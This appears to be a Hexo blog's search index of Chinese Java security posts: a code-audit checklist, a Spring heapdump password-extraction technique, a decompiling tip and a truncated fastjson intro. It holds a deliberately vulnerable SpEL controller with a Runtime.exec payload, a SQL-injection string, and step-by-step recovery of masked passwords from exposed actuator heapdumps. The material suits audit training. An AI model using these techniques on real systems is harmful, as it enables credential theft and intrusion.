<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>java代码审计思路</title>
    <url>/2020/08/24/CodeAudit/</url>
    <content><![CDATA[<p>常见的审计思路<br>1.查看目录结构，查看配置文件，判断框架信息<br>2.查看使用的类库包是否安全<br>3.filter、controller<br>4.数据查询<br>5.危险函数审计<br>6.查看xml配置的数据库信息和文件信息<br>7.黑盒测试对应白盒测试功能点</p>
<p>spring mvc-ssh标准结构<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793539536195.jpg" alt=""><br>spring-mvc框架<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15830545953263.jpg" alt="-w658"></p>
<p>applicationContext.xml<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793539686059.jpg" alt=""></p>
<p>正向审计是查看程序功能点与代码对应关系<br>反向审计是搜索函数去查找功能点</p>
<p>readObject（）实例具体步骤<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793600856289.jpg" alt=""></p>
<p>mvn结构详解<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793601189838.jpg" alt=""></p>
<h2 id="常见sping-mvc和spring-boot区别"><a href="#常见sping-mvc和spring-boot区别" class="headerlink" title="常见sping-mvc和spring-boot区别"></a>常见sping-mvc和spring-boot区别</h2><p>1.下载源码解压以后查看是否有web.xml，有的化就是spring-mvc,没有的化就是注解模式-spring-boot</p>
<p>存在 web.xml 配置的 java web 项目，servlet3.0 的 java web 项目，springboot 内嵌容器的 java web 项目加载 servlet，filter，listener 的</p>
<p>ServletContainerInitializer 也是 Servlet 3.0 新增的一个接口，容器在启动时使用 JAR 服务 API(JAR Service API) 来发现 ServletContainerInitializer 的实现类，并且容器将 WEB-INF/lib 目录下 JAR 包中的类都交给该类的 onStartup() 方法处理，我们通常需要在该实现类上使用 @HandlesTypes 注解来指定希望被处理的类，过滤掉不希望给 onStartup() 处理的类。</p>
<p>一个典型的 servlet3.0+ 的 web 项目结构如下：<br>.<br>├── pom.xml<br>└── src<br>    ├── main<br>    │   ├── java<br>    │   │   └── moe<br>    │   │       └── cnkirito<br>    │   │           ├── CustomServletContainerInitializer.java<br>    │   │           ├── filter<br>    │   │           │   └── HelloWorldFilter.java<br>    │   │           └── servlet<br>    │   │               └── HelloWorldServlet.java<br>    │   └── resources<br>    │       └── META-INF<br>    │           └── services<br>    │               └── javax.servlet.ServletContainerInitializer<br>    └── test<br>        └── java</p>
<p>注册方式一：servlet3.0注解+@ServletComponentScan<br>springboot 依旧兼容 servlet3.0 一系列以 @Web* 开头的注解：@WebServlet，@WebFilter，@WebListener</p>
<p>@WebServlet(“/hello”)<br>public class HelloWorldServlet extends HttpServlet{}</p>
<p>注册方式二：RegistrationBean<br>@Bean<br>public ServletRegistrationBean helloWorldServlet() {<br>    ServletRegistrationBean helloWorldServlet = new ServletRegistrationBean();<br>    myServlet.addUrlMappings(“/hello”);<br>    myServlet.setServlet(new HelloWorldServlet());<br>    return helloWorldServlet;<br>}</p>
<p>@Bean<br>public FilterRegistrationBean helloWorldFilter() {<br>    FilterRegistrationBean helloWorldFilter = new FilterRegistrationBean();<br>    myFilter.addUrlPatterns(“/hello/*”);<br>    myFilter.setFilter(new HelloWorldFilter());<br>    return helloWorldFilter;<br>}</p>
<h2 id="常见web-api框架"><a href="#常见web-api框架" class="headerlink" title="常见web-api框架"></a>常见web-api框架</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><p>webervice<br>    -soap<br>    -WSDL<br>    -UDDI<br>    -调用RPC与消息传递<br>    -restful接口<br>    -swagger<br>DWr<br>Hessian<br>GWT接口<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793279189535.jpg" alt="-w1141"></p>
<h4 id="WEBSERVICE接口"><a href="#WEBSERVICE接口" class="headerlink" title="WEBSERVICE接口"></a>WEBSERVICE接口</h4><p>漏洞点<br>1.默认的安全配置<br>2.未授权的访问<br>3.自身未修复漏洞</p>
<p>burp常见的样式，后缀是.wsdl<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793294814921.jpg" alt="-w429"><br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793295045371.jpg" alt="-w433"></p>
<p>service，serivces，ws，webservice</p>
<h5 id="swagger-接口"><a href="#swagger-接口" class="headerlink" title="swagger 接口"></a>swagger 接口</h5><p>在pom.xml中添加Swagger依赖<br>创建Swagger配置类，与Application.java同级目录</p>
<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793282856854.jpg" alt=""><br>常见的路径是<br>/swagger-ui.html</p>
<p>swagger测试网站<br><a href="http://editor.swagger.io/" target="_blank" rel="noopener">http://editor.swagger.io/</a><br><a href="https://github.com/swagger-api/swagger-editor/releases" target="_blank" rel="noopener">https://github.com/swagger-api/swagger-editor/releases</a></p>
<h5 id="RESTful接口"><a href="#RESTful接口" class="headerlink" title="RESTful接口"></a>RESTful接口</h5><p>RESTFUL是一种网络应用程序的设计风格和开发方式，基于HTTP，可以使用XML格式定义或JSON格式定义</p>
<p>在Restful<br><a href="http://127.0.0.1/user/query/1" target="_blank" rel="noopener">http://127.0.0.1/user/query/1</a> GET 根据用户id查询用户数据<br><a href="http://127.0.0.1/user/save" target="_blank" rel="noopener">http://127.0.0.1/user/save</a> POST 新增用户<br><a href="http://127.0.0.1/user/update" target="_blank" rel="noopener">http://127.0.0.1/user/update</a> POST 修改用户信息<br><a href="http://127.0.0.1/user/delete/1" target="_blank" rel="noopener">http://127.0.0.1/user/delete/1</a> GET/POST 删除用户信息</p>
<p>RESTful用法：<br><a href="http://127.0.0.1/user/1" target="_blank" rel="noopener">http://127.0.0.1/user/1</a> GET 根据用户id查询用户数据<br><a href="http://127.0.0.1/user" target="_blank" rel="noopener">http://127.0.0.1/user</a> POST 新增用户<br><a href="http://127.0.0.1/user" target="_blank" rel="noopener">http://127.0.0.1/user</a> PUT 修改用户信息<br><a href="http://127.0.0.1/user" target="_blank" rel="noopener">http://127.0.0.1/user</a> DELETE 删除用户信息</p>
<h5 id="soap"><a href="#soap" class="headerlink" title="soap"></a>soap</h5><p>使用工具是soapui<br>soap请求 (Simple Object Access Protocol，简单对象访问协议) 是HTTP POST的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml任何数据都可以xml化。</p>
<h4 id="DWR接口"><a href="#DWR接口" class="headerlink" title="DWR接口"></a>DWR接口</h4><p>web.xml<br><init-param><br>            <param-name>debug</param-name><br>            <param-value>true</param-value><br></init-param><br><servlet-mapping><br>        <servlet-name>dwr-invoker</servlet-name><br>        <url-pattern>/dwr/*</url-pattern><br></servlet-mapping><br>dwr.xml<br><create javascript="commonparams" creator="new"></p>
<param name="class" value="com.example.dwr.commontest.CommonParams" />
</create>

<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793294153241.jpg" alt="-w586"></p>
<p>漏洞点<br>1.默认的安全配置项<br>2.未授权的访问<br>3.Debug状态下的问题</p>
<p>/dwr/index.html，/exec/index.html<br>HESSIAN接口<br>GWT接口</p>
<h4 id="HESSIAN接口"><a href="#HESSIAN接口" class="headerlink" title="HESSIAN接口"></a>HESSIAN接口</h4><servlet-mapping>
     <servlet-name>
         HessianSpringInvokeService
     </servlet-name>
<url-pattern>/*.hessian</url-pattern>
</servlet-mapping>
web.xml
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">	xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">	xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot;</span><br><span class="line">	xmlns:tx&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&quot;</span><br><span class="line">	xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">    http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-2.0.xsd</span><br><span class="line">    http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&#x2F;spring-tx-2.0.xsd</span><br><span class="line">    http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop-2.0.xsd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- hessian服务通过spring暴露出去 --&gt;</span><br><span class="line">  &lt;bean id &#x3D;&quot;EncryptService.hessian&quot; class &#x3D;&quot;com.ufgov.admin.license.svc.EncryptServiceImpl&quot;&gt;</span><br><span class="line">  &lt;&#x2F;bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
看访问的文件格式默认是.hession
看content-type中：x-application/hession
![-w922](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297519770.jpg)
![-w768](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297646908.jpg)
![-w910](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297829526.jpg)

<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793298098840.jpg" alt="-w910"></p>
<p>1.未授权的访问<br>2.自带绕waf光环<br>3.自身未修复漏洞</p>
<h4 id="GWT接口"><a href="#GWT接口" class="headerlink" title="GWT接口"></a>GWT接口</h4><p>漏洞<br>1.未授权访问<br>2.自带绕waf光环<br>3.接口枚举猜测</p>
<servlet>
<servlet-name>greetServlet</servlet-name>
<servlet-class>
com.google.gwt.sample.validation.server.GreetingServiceImpl
</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>greetServlet</servlet-name>
<url-pattern>/gwtrpcservlet</url-pattern>
</servlet-mapping>
web.xml

<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793299162725.jpg" alt="-w605"></p>
<h2 id="idea快捷键"><a href="#idea快捷键" class="headerlink" title="idea快捷键"></a>idea快捷键</h2><p>搜索文件名 shift 双击<br>Ctrl+N 按名字搜索类<br>在按照文本的内容查找 Control + Shift + F<br>Ctrl+Shift+N按文件名搜索文件<br>Ctrl+H 查看类的继承关系，例如HashMap的父类是AbstractMap<br>Ctrl+Alt+B查看子类方法实现 或者 Ctrl+Alt+鼠标左键<br>Ctrl+B可以查看父类或父方法定义，但是不如ctrl+鼠标左键方便<br>Alt+F7查找类或方法在哪被使用<br>显示便捷提示和快速修复 cmd + Enter<br>快速生成代码 Control + Enter<br>选中方法，查看参数信息 Cmd + P<br>弹出当前打开的文件列表 Cmd + E<br>根据0到9之间的数字，打开各个相应的工具窗口  Cmd+num 0-9<br>打开整个IDEA属性配置对话框 cmd + ,<br>查找当前文件 Cmd + F<br>快速定位到某一行某一列  Cmd + G<br>环绕选中代码块，生成注释 cmd + option + T<br>注释代码或者取消注释  Cmd + /<br>格式化代码  Cmd + option + L<br>优化导入，删除掉没用被使用的导入  Cmd + Option + O<br>缩进选中的行 tab<br>取消缩进选中的行 shift + tab<br>选中的单词或者代码，切换大小写  cmd + shift + u<br>返回或者前进最近编辑的地方 cmd + option + &lt;- -&gt;<br>打开变量声明处 cmd + B 或者 cmd + 鼠标左键<br>打开类型声明处 cmd + shift + B<br>插入注释模板 CMD + j </p>
<h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><p><strong>java命令执行审计</strong><br> ProcessBuilder.start()<br> Runtime.getRuntime().exec()<br> GroovyShell.evaluate()<br> exec、cmd、shell</p>
<p> 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等<br> 避免命令用户可控</p>
<p> <strong>java反序列化审计</strong><br>  从上可得出结论，如果一个类需要序列化那么需要这个类或者父类实现 Serializable或者Externalizable接口。<br>对一个类进行序列化需要执行ObjectOutputStream.writeObject方法写入 对象<br>对一个类进行反序列化需要ObjectInputStream.readObject从输入流中读 取字节然后转换成对象<br>在反序列的过程中，被反序列化操作的类不会执行构造方法。<br> Serializable<br>Externalizabl<br>Externalizable<br>Transient<br>ObjectOutputStream.writeObject<br>readObject<br>writeObject<br>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br>JSON.parseObject</p>
<p><strong>任意文件上传</strong><br>ServletFileUpload<br>FileItemStream<br>MultipartFile<br>new FileInputStream()<br>new FileOutputStream()<br>new File()<br>new BufferedReader()<br>new ServletFileUpload()<br>new MultipartFile()<br>CommonsMultipartFile<br>printWrite<br>upload，write,fileName ,filePath<br>MultipartFile<br>createNewFile<br>FileInputStream</p>
<p><strong>任意文件下载</strong><br>download 、<br>fileName 、<br>filePath、<br>write、<br>getFile、<br>getWriter</p>
<p><strong>任意文件删除</strong><br>delete, deleteFile,fileName ,filePath</p>
<p><strong>CSRF</strong><br>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有 没有添加 token 的防护机制</p>
<p><strong>输入方面进行总结</strong><br>? request.getQueryString() ? request.getParameterMap() ? request.getParameterNames() ? request.getParameter() ? request.getHeader() ? request.getHeaders() ? request.getHeaderNames() ? req.getInputStream() ? ⋯⋯.</p>
<p><strong>sql注入</strong><br>? prepareStatement()<br>? createStatement()<br> ? executeQuery()<br>? executeUpdate()<br>? execute()<br>$（） #<br>Select、Dao 、from 、delete 、update、insert</p>
<ul>
<li>append</li>
</ul>
<p><strong>缓冲区溢出</strong><br>strcpy,strcat,scanf,memcpy,memmove,memeccpy Getc(),fgetc(),getchar;read,printf</p>
<p><strong>ssrf</strong><br>HttpURLConnection.getInputStream<br>URlConnection.getInputStream<br>Request.Get.execute<br>Request.Post.execute<br>URL.openStrem<br>ImagesIO.read<br>OkHttpClient.newCall.execute<br>HttpClients.execute<br>HttpClinet.execute<br>HttpClient.executeMethod<br>HttpURLConnection.connect<br>HttpURLConnection.getInputStream<br>URL.openStream</p>
<p><strong>xxe</strong><br>XMLReaderFactory.createXMLReader();<br>new SAXReader<br>new SAXBuilder<br>DocumentBuilderFactory<br>XPathExpression<br>DocumentBuilder<br>TransformerFactory<br>javax.xml.parsers.DocumentBuilder<br>javax.xml.stream.XMLStreamReader<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader<br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource<br>javax.xml.transform.TransformerFactory<br>javax.xml.transform.sax.SAXTransformerFactory<br>javax.xml.validation.SchemaFactory<br>javax.xml.bind.Unmarshaller</p>
<p>DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser SAXReader 、XMLReader SAXSource 、TransformerFactory 、SAXTransformerFactory 、 SchemaFactory</p>
<p><strong>硬编码</strong><br>密码硬编码、密码明文存储<br>password 、pass、jdbc</p>
<p><strong>xss</strong><br>getParamter、&lt;%=、param.</p>
<p><strong>spel表达式注入</strong><br>Spel是Spring框架el表达式的缩写，当使用SpelExpressionParser解析spel表达式，且表达式可被外部控制，则可能导致SPel表达式注入从而造成RCE，如CVE-2018-1260就是spring-security-oauth2的一个SPel注入导致的RCE 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExpressionParser PARSER &#x3D; new SpelExpressionParser();</span><br><span class="line">Expression exp &#x3D; PARSER.parseExpression(el)</span><br><span class="line"></span><br><span class="line">@RequestMapping(path &#x3D; &quot;&#x2F;elinjection&quot;)</span><br><span class="line">public class SPelInjectionController &#123;</span><br><span class="line">    @RequestMapping(value&#x3D;&quot;&#x2F;spel.html&quot;,method&#x3D; RequestMethod.GET)</span><br><span class="line">    public String SPelInjection(ModelMap modelMap, HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">        String el&#x3D;request.getParameter(&quot;el&quot;);</span><br><span class="line">        &#x2F;&#x2F;el&#x3D;&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open &#x2F;Applications&#x2F;Calculator.app\&quot;)&quot;;</span><br><span class="line">        ExpressionParser PARSER &#x3D; new SpelExpressionParser();</span><br><span class="line">        Expression exp &#x3D; PARSER.parseExpression(el);</span><br><span class="line">        return (String)exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Expression<br>SpelExpressionParser<br>getValue</p>
<p><strong>文件上传</strong><br>MultipartFile</p>
<p><strong>Autobinding-自动绑定漏洞</strong><br>这里使用了@ModelAttribute User user，实际上这里是从session中获取user对象。但存在问题是如果在请求中添加user对象的成员变量时则会更改user对象对应成员的值。<br>所以当我们给resetQuestionHandler发送GET请求的时候可以添加“answer=hehe”参数，这样就可以给session中的对象赋值，将原本密码找回的安全问题答案修改成“hehe”。这样在最后一步校验安全问题时即可验证成功并找回密码<br>@SessionAttributes<br>@ModelAttribute</p>
<p><strong>压缩包文件上传</strong><br>看上传的文件是否可以控制解压路径<br>是否有xxe</p>
<p><strong>excel xxe</strong><br>Poi-ooxml.jar的XXE漏洞</p>
<p>xlsx-streamer.jar<br>XSSFReader()和document()函数</p>
<p><strong>URL重定向</strong><br>sendRedirect<br>setHeader<br>forward</p>
<p><strong>日志记录敏感信息</strong><br>log log.info logger.info</p>
<p><strong>不安全组件暴露</strong><br>activity 、 Broadcast Receiver 、 Content Provider 、 Service 、 inter-filter</p>
<p><strong>代码执行</strong><br>eval、system、exec</p>
<p><strong>越权</strong><br>水平、垂直越权不需关注特定函数，只要在处理用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞</p>
<p><strong>批量请求</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/ifUserExit"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">"phone"</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"用户已被注册"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>信息泄露</strong><br>js中搜索<br>ip，密码，账号，测试账号，137，139，用户，ftp配置,192.168,  10.  http， https</p>
<p>预编译<br>SELECT * From table_name WHERE name=‘XX’ and password=‘YY’ and corporate=‘ZZ’</p>
<p>添加 ‘ or 1=1 -<br>SELECT * From table_name WHERE name=’’ and password=’’ and corporate=’’ or 1=1-‘<br>使用预编译后会吧后边当做一个整体</p>
<p>mybatis<br><strong>Statement的几种实现</strong><br>Statement 对象用于将SQL语句发送到数据库中。<br>Statement每次执行SQL语句，数据库都要执行SQL语句的编译，最好用于仅执行一次查询并返回结果的情形<br>1、执行静态SQL语句。通常通过Statement实例实现。<br>2、执行动态SQL语句。通常通过PreparedStatement实例实现。<br>3、执行数据库存储过程。通常通过CallableStatement实例实现。</p>
<p><strong>’和‘$’的区别</strong><br>sql 预编译指的是数据库驱动在发送 sql 语句和参数给 DBMS 之前对 sql 语句进行编译，这样 DBMS 执行 sql 时，就不需要重新编译。<br>‘#{ }’：解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个‘ #{ }’ 被解析为一个参数占位符 ? 。<br>‘${ }’ 仅仅为一个纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换。在预编译之前已经被变量替换了<br>‘${ }’变量的替换阶段是在动态 SQL 解析阶段，而’#{ }’变量的替换是在 DBMS 中。</p>
<p><strong>PreparedStatement与Statement有什么区别</strong><br>1.PreparedStatement能预编译，这条预编译的SQL查询语句能在将来的查询中重用，这样一来，它比Statement对象生成的查询速度更快。<br>2.PreparedStatement可以写动态参数化的查询<br>3.PreparedStatement可以防止SQL注入式攻击<br>4.PreparedStatement查询可读性更好，追加条件的语句很乱<br>5.PreparedStatement不允许一个占位符（？）有多个值</p>
<p>hibernate参数绑定</p>
<h2 id="快速审计"><a href="#快速审计" class="headerlink" title="快速审计"></a>快速审计</h2><p>1 查看jar包<br>2 标记为spring 然后查看路由<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15875255296560.jpg" alt="-w1597"></p>
<p>查找路由<br>@RequestMapping({</p>
<h2 id="jar包安全"><a href="#jar包安全" class="headerlink" title="jar包安全"></a>jar包安全</h2><p>fastjson &lt;=1.2.48可以rce；&lt;=1.2.58可以dos<br>Apache Shiro &lt; 1.24 反序列漏洞<br>jackson &lt;= 2.9.2 反序列化漏洞<br>Poi-ooxml.jar &lt;=3.11 dos xxe<br>xlsx-streamer.jar &lt;=2.0.0  xxe<br>Spring 5.0.x&lt; 5.0.6  Spring 4.3.x&lt; 4.3.7<br>Struts 2.0.4 - Struts 2.3.34 Struts 2.5.0 - Struts 2.5.16<br>XStream(XStream Core)&lt; 1.4.11.1 ;1.4.10可以直接rce，1.4.11.1利用jdni注入</p>
<p>dubbo版本&lt;2.7.5，http协议反序列化漏洞（CVE-2019-17564）<br>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4<br>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7<br>Apache Dubbo 2.5.x 的所有版本</p>
<h2 id="危险利用链"><a href="#危险利用链" class="headerlink" title="危险利用链"></a>危险利用链</h2><p>commons-fileupload 1.3.1<br>commons-io 2.4<br>commons-collections 3.1<br>commons-logging 1.2<br>commons-beanutils 1.9.2<br>org.slf4j:slf4j-api 1.7.21<br>com.mchange:mchange-commons-java 0.2.11<br>org.apache.commons:commons-collections 4.0<br>com.mchange:c3p0 0.9.5.2<br>org.beanshell:bsh 2.0b5<br>org.codehaus.groovy:groovy 2.3.9<br>org.springframework:spring-aop 4.1.4.RELEASE</p>
<h2 id="白盒检测"><a href="#白盒检测" class="headerlink" title="白盒检测"></a>白盒检测</h2><p>搜索以下函数：<br>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br>JSON.parseObject</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cws6.github.io/2018/09/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://cws6.github.io/2018/09/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/</a></p>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>批量反编译class</title>
    <url>/2017/05/26/fanbianiyi/</url>
    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar" target="_blank" rel="noopener">fernflower.jar</a> 批量反编译class</strong></p>
<p><strong>批量反编译</strong></p>
<ul>
<li>首先把工程的所有class压缩成classes.zip</li>
<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
</ul>
]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>java反编译工具</tag>
        <tag>fernflower.jar</tag>
      </tags>
  </entry>
  <entry>
    <title>MAT 查找 spring heapdump 中的密码明文</title>
    <url>/2020/08/25/SpringBootHeapdump/</url>
    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip" target="_blank" rel="noopener"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html" target="_blank" rel="noopener">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw" target="_blank" rel="noopener">xray社区记一次信息泄漏到RCE</a></p>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>黑盒测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/04/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>fastjson黑盒测试与白盒审计</title>
    <url>/2020/08/03/fastjson/</url>
    <content><![CDATA[<h2 id="简介与漏洞史"><a href="#简介与漏洞史" class="headerlink" title="简介与漏洞史"></a>简介与漏洞史</h2><p>文章首发<a href="https://xz.aliyun.com/t/7104" target="_blank" rel="noopener">先知</a></p>
<pre><code>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，
fastjson是阿里巴巴一个开源的json相关的java library，
地址在这里，https://github.com/alibaba/fastjson，
Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，
